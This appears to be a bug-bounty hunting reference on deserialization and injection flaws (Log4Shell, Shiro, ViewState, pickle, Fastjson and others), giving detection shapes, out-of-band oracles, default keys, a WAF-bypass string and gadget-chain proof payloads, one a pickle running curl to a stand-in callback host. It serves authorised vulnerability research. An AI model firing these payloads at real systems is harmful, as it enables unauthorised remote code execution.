# Case Patterns — converted shapes + the oracles that confirm them

Distilled hunting shapes with the exact oracle that turns each into a payable
finding. These are recognition patterns, not detectors: seeing the shape means
"probe this class," not "it's vulnerable." Prove with the DNS-only oracle, then the
benign command.

## Next.js RSC (mass-exploited — be first or skip)

Shape: `x-powered-by: Next.js`, `content-type: text/x-component`, Server Actions.
Oracle: the 2-step 404-then-500 probe; the `500`-with-RSC-body is positive. Proof:
benign `id`/`whoami` in the `digest` field. Full technique + corpus proof in
`../../_shared/references/nextjs-rsc-deser.md` (shared with rce-hunting). Be FIRST —
RCE PoCs get dup'd because the CVE is popular; DoS-only skews informative.

## ViewState with MAC off or a known machineKey

Shape: `__VIEWSTATE`/`/wE`, WebForms/Exchange OWA. Oracle: corrupt trailing MAC ->
`500 Validation of viewstate MAC failed` (MAC on, need key) vs silent accept (MAC
off, forge freely). Known key: Exchange default `CB2721ABDAF8E9DC...`
(CVE-2020-0688). Proof: `ysoserial.net -p ViewState` with a benign OOB command.

## Shiro rememberMe default key

Shape: `Set-Cookie: rememberMe=deleteMe` on an invalid cookie. Oracle: the
fingerprint itself. Proof: AES-CBC(`kPH+bIxk5D2deZiIxcaaaA==`) around a ysoserial
`CommonsBeanutils1` gadget -> OOB callback (CVE-2016-4437). See `java.md` +
`leaked-key-forge.md`.

## Java native blob in a cookie/field

Shape: `rO0`/`aced0005`. Oracle: `ysoserial URLDNS http://<id>.oob` -> DNS hit =
`readObject()` on your bytes, zero exec. Proof: swap to `CommonsCollections6 id`.
The `ClassNotFoundException`/`InvalidClassException` error is a positive confirm,
not a stop.

## Fastjson / Jackson polymorphic typing

Shape: `@type`/`$type`/`@class` accepted, `autoType is not support` error. Oracle:
`{"@type":"java.net.Inet4Address","val":"<id>.oob"}` -> DNS callback. Proof:
`JdbcRowSetImpl` + `ldap://<id>.oob` with a rogue-JNDI listener. See `java.md`.

## Log4Shell in any logged field

Shape: any user string that gets logged (UA, headers, username, filename). Oracle:
`${jndi:dns://<id>.oob/x}` -> DNS callback = confirmed, no exec. WAF bypass:
`${${::-j}ndi:...}`. CVE-2021-44228.

## PHP object injection / PHAR

Shape: `O:`/`a:` serialized value, or a user path reaching a file function without
`phar://` blocking. Oracle: byte-flip -> `unserialize()` warning /
`__PHP_Incomplete_Class`; for PHAR, a benign path echoes the reached file function.
Proof: `phpggc Laravel/RCE9 system id` in the sink, or a PHAR polyglot upload +
trigger. Leaked `APP_KEY` -> forge the encrypted cookie (CVE-2018-15133).

## Python pickle / YAML / signed session

Shape: `gA[JNSW]`/`\x80[\x02-\x05]` (pickle proto 2/3/4/5 — proto 2 is what Celery
and Django pin), `!!python/object`, Flask `eyJ...` cookie. Oracle:
byte-flip -> `UnpicklingError`; YAML constructor error. Proof: `__reduce__`
`os.system('curl <oob>')` pickle, or `flask-unsign --sign` with a leaked/cracked
key (pickle serializer -> RCE). See `python.md`.

## Ruby Marshal / YAML / Rails cookie

Shape: `BAh`, `!ruby/object`, `_session` cookie. Oracle: `Psych::DisallowedClass`
or object-tag error confirms a rich loader. Proof: universal Ruby gadget, or forge
the session with a leaked `secret_key_base` (Marshal serializer -> RCE). See
`node-ruby.md`.

## node-serialize / prototype pollution

Shape: `_$$ND_FUNC$$_`, `__proto__`/`constructor` keys in JSON. Oracle: tagged value
reflected; polluted marker property observed. Proof: self-invoking
`_$$ND_FUNC$$_function(){...}()` OOB, or pollution -> template/`child_process`
gadget sink. See `node-ruby.md`.

## Base64 YAML parameter

Shape: a base64 param that decodes to YAML parsed before schema validation. Oracle:
YAML object-tag rejected cleanly vs accepted. Proof: SnakeYAML `ScriptEngineManager`
outbound fetch (Java) or `!!python/object/apply` (Python).

## Evidence-upgrade heuristic

Confidence rises when two+ hold: user controls the serialized bytes/key/config; the
server resolves an attacker-controlled class/type/module; integrity is
absent/weak/leaked/known-default; a DNS-only oracle fired; a benign command
returned output or an OOB callback. The last one is the finding — stop climbing
only once you have it (or its UAT equivalent per the safe ladder).
